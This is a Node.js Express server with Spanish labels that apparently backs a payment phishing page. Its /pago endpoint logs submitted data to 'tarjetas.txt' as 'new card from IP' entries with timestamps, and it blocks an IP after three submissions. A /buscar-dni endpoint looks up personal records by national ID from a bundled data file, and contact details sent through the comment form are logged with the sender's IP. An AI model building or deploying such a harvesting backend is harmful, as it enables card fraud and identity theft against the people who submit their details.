const express = require('express');
const cors = require('cors');
const morgan = require('morgan');
const helmet = require('helmet');
const fs = require('fs');
const path = require('path');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(helmet());
app.use(morgan('dev'));
app.use(express.json());
app.set('trust proxy', true);
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const requestLog = {};
const BLOCK_THRESHOLD = 3;

app.post('/pago', (req, res) => {
    const ip = req.ip;

    if (!requestLog[ip]) {
        requestLog[ip] = { count: 1 };
    } else {
        requestLog[ip].count += 1;
    }

    if (requestLog[ip].count > BLOCK_THRESHOLD) {
        requestLog[ip].blocked = true;
    }

    if (requestLog[ip].blocked) {
        console.log(`Blocked IP: ${ip}`);
        return res.status(403).send('Access denied');
    }

    logRequestData(req);
    res.json({ message: 'Data received and logged!' });
});

app.post('/buscar-dni', (req, res) => {
    const dni = req.body.dni;
    if (!dni) return res.status(400).json({ error: 'DNI requerido' });

    const jsonPath = path.join(__dirname, 'public', 'datos.json');
    fs.readFile(jsonPath, 'utf8', (err, data) => {
        if (err) {
            console.error('Error leyendo datos.json:', err);
            return res.status(500).json({ error: 'Error leyendo datos' });
        }

        try {
            const jsonData = JSON.parse(data);
            const resultados = jsonData.filter(c =>
                c.numdoc == dni || c.Dni == dni
            );
            res.json(resultados);
        } catch (parseErr) {
            console.error('Error al parsear JSON:', parseErr);
            res.status(500).json({ error: 'Error parseando datos' });
        }
    });
});

app.post('/comentario', (req, res) => {
    const { nombre, email, telefono, mensaje } = req.body;

    if (!nombre || !email || !telefono || !mensaje) {
        return res.status(400).json({ error: 'Faltan campos en el comentario' });
    }

    const now = new Date();
    const hora = now.toLocaleTimeString('es-AR', { hour: '2-digit', minute: '2-digit', hour12: true });
    const fecha = now.toLocaleDateString('es-AR');
    const ip = req.ip;

    const comentarioTexto =
        `--- Comentario desde IP: ${ip} ---\n` +
        `Fecha: ${fecha} | Hora: ${hora}\n` +
        `Nombre: ${nombre}\n` +
        `Email: ${email}\n` +
        `Teléfono: ${telefono}\n` +
        `Mensaje: ${mensaje}\n\n`;

    fs.appendFile('comentarios.txt', comentarioTexto, (err) => {
        if (err) {
            console.error('Error guardando comentario:', err);
            return res.status(500).json({ error: 'Error guardando comentario' });
        }
        res.json({ mensaje: 'Comentario recibido' });
    });
});

function logRequestData(req) {
    const data = req.body;
    const ip = req.ip;
    const now = new Date();

    const hora = now.toLocaleTimeString('es-AR', { hour: '2-digit', minute: '2-digit', hour12: true });
    const fecha = now.toLocaleDateString('es-AR');

    const separator = `--- Nueva tarjeta de IP: ${ip} ---\n--- HORA: ${hora} ---\n--- DÍA: ${fecha} ---\n`;
    const logData = separator + JSON.stringify(data, null, 2) + '\n\n';

    fs.appendFile('tarjetas.txt', logData, (err) => {
        if (err) console.error('Error writing to file:', err);
    });
}

let clients = new Set();

wss.on('connection', function connection(ws) {
    clients.add(ws);
    broadcastCount();

    ws.on('close', function () {
        clients.delete(ws);
        broadcastCount();
    });
});

function broadcastCount() {
    const count = clients.size;
    const message = JSON.stringify({ type: 'count', count });
    for (const client of clients) {
        if (client.readyState === WebSocket.OPEN) {
            client.send(message);
        }
    }
}

server.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
